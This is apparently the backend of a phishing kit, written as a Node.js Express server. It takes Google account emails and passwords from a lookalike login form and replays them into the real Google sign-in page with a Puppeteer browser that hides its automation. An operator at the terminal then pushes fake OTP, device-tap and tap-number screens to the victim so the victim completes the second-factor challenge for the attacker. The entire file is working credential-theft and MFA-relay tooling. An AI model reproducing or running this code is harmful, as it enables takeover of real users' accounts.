// backend/server.js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const readline = require('readline');
const path = require('path');
const os = require('os');
const puppeteer = require('puppeteer');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// --- AUTH FLOW STATE ---
const authFlowState = {
    currentUser: null,
    authState: 'standby',
    awaitingTapNumber: false,
    customTapNumber: 0,
    authTimeout: null,
};

// --- BROWSER AUTOMATION ---
let browser = null;
let activePage = null;
const AUTH_TIMEOUT = 5 * 60 * 1000; // 5 min

// --- SSE CLIENTS ---
let sseClients = [];

// --- READLINE FOR TERMINAL ---
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

// --- MIDDLEWARE ---
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '../frontend')));
app.use('/assets', express.static(path.join(__dirname, '../assets')));
app.use(session({
    secret: process.env.SESSION_SECRET || 'local-auth-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000
    }
}));

// --- STATE LOGGING ---
function logState(message) {
    console.log(`[STATE_TRACE] ${new Date().toISOString()}: ${message} | currentUser: ${JSON.stringify(authFlowState.currentUser)}, authState: ${authFlowState.authState}, awaitingTapNumber: ${authFlowState.awaitingTapNumber}, customTapNumber: ${authFlowState.customTapNumber}`);
}

// --- SSE EVENT SENDER ---
function sendSseEvent(data) {
    sseClients.forEach(client => client.res.write(`data: ${JSON.stringify(data)}\n\n`));
}

// --- RESET AUTH STATE ---
async function resetAuthState() {
    logState('Resetting auth state');
    Object.assign(authFlowState, {
        currentUser: null,
        authState: 'standby',
        awaitingTapNumber: false,
        customTapNumber: 0,
    });
    if (authFlowState.authTimeout) {
        clearTimeout(authFlowState.authTimeout);
        authFlowState.authTimeout = null;
    }
    await closeBrowser();
    sendSseEvent({ state: 'restart_login' });
}

// --- AUTH TIMEOUT ---
function setAuthTimeout() {
    if (authFlowState.authTimeout) clearTimeout(authFlowState.authTimeout);
    authFlowState.authTimeout = setTimeout(resetAuthState, AUTH_TIMEOUT);
}

// --- BROWSER FUNCTIONS ---
async function launchBrowser() {
    if (browser) return;

    let userDataDir = process.env.CHROME_USER_DATA_DIR || path.join(os.homedir(), '.config/google-chrome');
    if (userDataDir.startsWith('~')) userDataDir = userDataDir.replace(/^~/, os.homedir());

    console.log('🚀 Launching browser with profile:', userDataDir);
    browser = await puppeteer.launch({
        headless: false,
        userDataDir,
        args: ['--no-sandbox', '--disable-setuid-sandbox'],
        ignoreDefaultArgs: ['--enable-automation'],
        ignoreHTTPSErrors: true
    });
}

async function automateGoogleLogin(email, password) {
    try {
        await launchBrowser();
        activePage = await browser.newPage();
        await activePage.evaluateOnNewDocument(() => { Object.defineProperty(navigator, 'webdriver', { get: () => false }); });
        await activePage.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36');

        console.log('Navigating to Google sign-in page...');
        await activePage.goto('https://accounts.google.com/signin/v2/identifier', { waitUntil: 'networkidle2', timeout: 30000 });
        console.log('Typing email...');
        await activePage.type('input[type="email"]', email, { delay: 100 });
        await activePage.click('#identifierNext');
        console.log('Waiting for password field...');
        await activePage.waitForSelector('input[type="password"]', { timeout: 10000 });
        console.log('Typing password...');
        await activePage.type('input[type="password"]', password, { delay: 100 });
        await activePage.click('#passwordNext');

        console.log('✅ Google login automation completed, browser ready.');
        return { success: true };
    } catch (err) {
        console.error('❌ Google automation error:', err.message);
        await resetAuthState();
        return { success: false, message: 'Google automation failed. Please check credentials and try again.' };
    }
}

async function closeBrowser() {
    if (browser) {
        console.log('🔒 Closing automated browser...');
        await browser.close();
        browser = null;
        activePage = null;
    }
}

// --- TERMINAL CONTROL ---
function showTerminalOptions(step, email = null, password = null) {
    console.log('\n' + '='.repeat(50));
    console.log(`👤 Current User: ${email || 'None'} | Step: ${step}`);
    if (password) console.log(`🔑 Password: ${'*'.repeat(password.length)}`);
    console.log(`\nChoose frontend screen:`);
    console.log('1. OTP input | 2. Tap notification | 3. Tap number | 4. Complete auth | 5. Restart');
    console.log('Enter choice (1-5):');
}

function handleTerminalChoice(input) {
    if (authFlowState.awaitingTapNumber) {
        const num = parseInt(input.trim());
        if (isNaN(num) || num < 0 || num > 9) return console.log('⚠️ Enter a number 0-9:');
        authFlowState.customTapNumber = num;
        authFlowState.awaitingTapNumber = false;
        authFlowState.authState = 'show_tap_number';
        logState('Tap number set');
        console.log(`🔢 Tap number: ${authFlowState.customTapNumber}`);
        sendSseEvent({ state: authFlowState.authState, number: authFlowState.customTapNumber });
        return;
    }

    let newState = null;
    switch (input.trim()) {
        case '1': newState = 'show_otp'; break;
        case '2': newState = 'show_device'; break;
        case '3': authFlowState.awaitingTapNumber = true; logState('awaitingTapNumber=true'); console.log('Enter tap number:'); return;
        case '4': newState = 'auth_success'; break;
        case '5': console.log('🔄 Restarting login...'); resetAuthState(); return;
        default: console.log('⚠️ Invalid choice'); if (authFlowState.currentUser) showTerminalOptions('password_entered', authFlowState.currentUser.email, authFlowState.currentUser.password); else showTerminalOptions('username_entered'); return;
    }

    if (newState) {
        authFlowState.authState = newState;
        logState(`authState->${newState}`);
        sendSseEvent({ state: authFlowState.authState });
    }
}

// --- ROUTES ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/login.html'));
});

app.post('/auth', async (req, res) => {
    try {
        const { email, password, step = 'username' } = req.body;
        console.log('\n' + '='.repeat(50), '🔐 NEW AUTH');

        if (step === 'username') {
            if (!email || typeof email !== 'string' || email.length < 5 || !email.includes('@')) return res.status(400).json({ success: false, message: 'Invalid email' });
            authFlowState.currentUser = { email };
            logState('Email received');
            setAuthTimeout();
            return res.json({ success: true, step: 'username_processed', message: 'Email processed. Enter password...' });
        }
        if (step === 'password') {
            if (!password || typeof password !== 'string') return res.status(400).json({ success: false, message: 'Provide password' });
            authFlowState.currentUser.password = password;
            logState('Password received');
            const result = await automateGoogleLogin(authFlowState.currentUser.email, authFlowState.currentUser.password);
            if (!result.success) {
                return res.status(400).json(result);
            }
            showTerminalOptions('password_entered', authFlowState.currentUser.email, password);
            return res.json({ success: true, step: 'password_processed', message: 'Password processed. Awaiting manual control...' });
        }
        return res.status(400).json({ success: false, message: 'Invalid step' });
    } catch (error) {
        console.error('Auth error:', error);
        await resetAuthState();
        return res.status(500).json({ success: false, message: 'An internal server error occurred.' });
    }
});

app.get('/auth/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    const clientId = Date.now();
    const newClient = { id: clientId, res };
    sseClients.push(newClient);

    req.on('close', () => {
        sseClients = sseClients.filter(client => client.id !== clientId);
    });
});

app.get('/check-session', (req, res) => {
    res.json(req.session.user ? { loggedIn: true, user: req.session.user } : { loggedIn: false });
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    resetAuthState();
    res.redirect('/');
});

app.post('/complete-auth', (req, res) => {
    try {
        if (authFlowState.authState === 'auth_success' && authFlowState.currentUser) {
            req.session.user = { email: authFlowState.currentUser.email, name: authFlowState.currentUser.email.split('@')[0], verified_email: true, auth_method: 'manual_control', auth_time: Date.now(), local_auth: true };
            console.log('✅ Session created for', authFlowState.currentUser.email);
            resetAuthState();
            return res.json({ success: true, message: 'Auth completed!', user: req.session.user });
        }
        return res.status(400).json({ success: false, message: 'Auth not ready' });
    } catch (error) {
        console.error('Complete auth error:', error);
        resetAuthState();
        return res.status(500).json({ success: false, message: 'An internal server error occurred during auth completion.' });
    }
});

// --- TERMINAL LOOP ---
function startTerminalControl() {
    rl.setPrompt('');
    console.log('🚀 Manual Authentication Control Started');
    rl.on('line', input => handleTerminalChoice(input));
}

// --- CLEANUP ---
process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down...');
    await closeBrowser();
    process.exit(0);
});

// --- START SERVER ---
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`🚀 Server running at http://localhost:${PORT}`);
        startTerminalControl();
    });
}

module.exports = { app };
